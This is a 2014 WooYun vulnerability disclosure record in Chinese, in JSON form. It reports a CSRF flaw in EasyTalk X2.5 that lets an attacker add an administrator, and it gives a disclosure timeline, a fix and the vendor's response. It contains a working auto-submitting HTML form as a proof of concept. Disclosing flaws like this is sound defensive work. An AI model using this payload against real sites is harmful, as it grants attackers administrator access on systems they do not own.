{"id": 57100, "wybug_id": "wooyun-2014-055324", "wybug_title": "EasyTalk_X2.5 csrf 可添加后台管理员", "wybug_corp": "nextsns.com", "wybug_author": "梧桐雨", "wybug_date": "2014-04-02 17:02", "wybug_open_date": "2014-07-01 17:03", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-01：\t细节向公众公开  简要描述： 看似加了token，实际呢？ 详细说明：  今天下载EasyTalk_X2.5回来本地，简单的测试了下。发现问题不少，节选一个较为严重的发布。添加管理员的时候，同时抓取数据包：发现是有加token的：__hash__:f36f2eb0cdb9794c6690722c0b6662ec_d59a5553239cc1aaea736ff3340579a5那么实际上，去掉是否能添加呢？答案是：可以测试添加管理员代码：\n<form action=\"http://localhost/EasyTalk_X2.5/admin.php?s=/Users/edituser\" method=\"post\" name=\"wutongyu\" id=\"wutongyu\"><input type=\"text\" name=\"user_name\" value=\"wutongyu\"/><input type=\"text\" name=\"user[nickname]\" value=\"wutongyu\"/><input type=\"text\" name=\"user[isadmin]\" value=\"1\"/></form><script>document.wutongyu.submit();</script>\n   漏洞证明：  首先先注册一个普通用户。管理员没访问之前是这样的：\n\n访问了上面的poc之后：\n\n   修复方案：  一定得验证token，否则加了也是白搭。   版权声明：转载请注明来源 梧桐雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-04-02 20:36 厂商回复： 得需要管理员登陆后才能这样操作 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}